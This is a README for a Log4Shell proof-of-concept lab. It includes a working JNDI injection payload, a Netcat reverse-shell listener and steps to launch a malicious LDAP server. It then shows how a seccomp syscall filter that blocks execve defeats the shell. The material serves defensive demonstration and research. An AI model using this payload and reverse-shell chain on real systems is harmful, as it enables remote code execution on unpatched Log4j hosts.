## Log4Shell
A small proof-of-concept for the Log4Shell vulnerability based on https://github.com/kozmer/log4j-shell-poc.
The vulnerable application is a simple login component which logs the username and password when login fails, using a vulnerable version of the Log4j logging framework.
The application is used to show how an attacker's capabilities can be restricted with a simple sandboxed execution environment
defined by the system calls that the application is allowed to make.

The code has only been tested on Ubuntu 22.04. 

## Requirements
The Maven project management tool has been used to compile the vulnerable application. However, testing the proof-of-concept should be possible without compiling
the vulnerable application since a compiled version of the vulnerable application is already included in this repository.

Python 3 is used to start a malicious LDAP server, serving a class `Exploit.class` which tries to establish a reverse shell.

Netcat is used to catch the reverse shell connection.


## Testing the exploit
1. Optionally, compile the vulnerable application by running `maven package`.
2. In a terminal window, start the vulnerable web application with the command `./jdk1.8.0_20/bin/java -cp target/log4shell-1.0-SNAPSHOT.jar com.poc.VulnerableApp VulnerableApp`.
3. In a second terminal window, start a Netcat listener with the command: `nc -lvnp 9001`.
4. In a third terminal window, start the malicious LDAP server with the command: `python3 poc.py --userip localhost --webport 8000 --lport 9001`.
5. In the vulnerable application, type in the following username `${jndi:ldap://localhost:1389/a}`. Then type in any password.
6. Go to the second terminal window. A reverse shell should now have been established. This can e.g. be tested by trying to run `ls` or `whoami`.

## Testing the exploit with a capability-restricted Java interpreter
The file `./java-soft` is a symbolic link to `./jdk1.8.0_20/bin/java`. However, `./java-soft` is capability-restricted, meaning that it is only allowed to
make a subset of all Linux system calls. In particular, `./java-soft` is not allowed to execute the `execve` system call which is used to establish
the reverse shell by executing `execve("/bin/sh", ...)`.

Thus, perform the same steps as above, but in step 2, start the vulnerable application with the capability-restricted version of the Java interpreter:
`./java-soft -cp target/log4shell-1.0-SNAPSHOT.jar com.poc.VulnerableApp VulnerableApp`.
After performing step 5, the vulnerable application should now terminate, and no reverse shell should be established.

If you run into issues, try recompiling the vulnerable application by running `maven package`.

## Creating the capability-restricted Java interpreter
The capability restricted Java interpreter was created by first analyzing the set of system calls required for the vulnerable application to
work properly. This was done using `strace`. In particular, the following command was executed:
```
strace -n -f -o trace.txt ./jdk1.8.0_20/bin/java -cp target/log4shell-1.0-SNAPSHOT.jar com.poc.VulnerableApp VulnerableApp
```
The vulnerable application was then used, trying to login with both invalid and valid logins before terminating the application.

Afterwards, a list of system call numbers were extracted with the command:
```
cat trace.txt | tail -n +2 | grep -E -o '\[[[:blank:]]*[[:digit:]]+\]' | grep -E -o '[[:digit:]]+' | sort -n | uniq | awk 'BEGIN{printf "["}NR>=0{printf "%s,", $1}END{printf "]\n"}' | sed 's/,\]/]/' > syscalls.json
```
Note that the first system call in `trace.txt` is `execve("./jdk1.8.0_20/bin/java", ...)` which is used to spawn the Java interpreter. 
Thus, this system call is ignored with the `tail -n +2` command.

A symbolic link to the Java interpreter was then created with:
```
ln -s ./jdk1.8.0_20/bin/java java-soft
```
Note that `./java-soft` is a binary ELF executable.

Lastly, a capability-restricted version of `./java-soft` was created with:
```
sudo ../sysfilter/enforcement/sysfilter_enforce --work-dir . ./java-soft syscalls.json
```
Note that the enforcement tool of the `sysfilter` library is used here. 
See https://gitlab.com/Egalito/sysfilter for more information on how to retrieve and use this tool. 
The enforcement tool works by patching the binary ELF executable to install a `seccomp-BPF` filter,
which ensures that only the specified set of system calls are allowed.
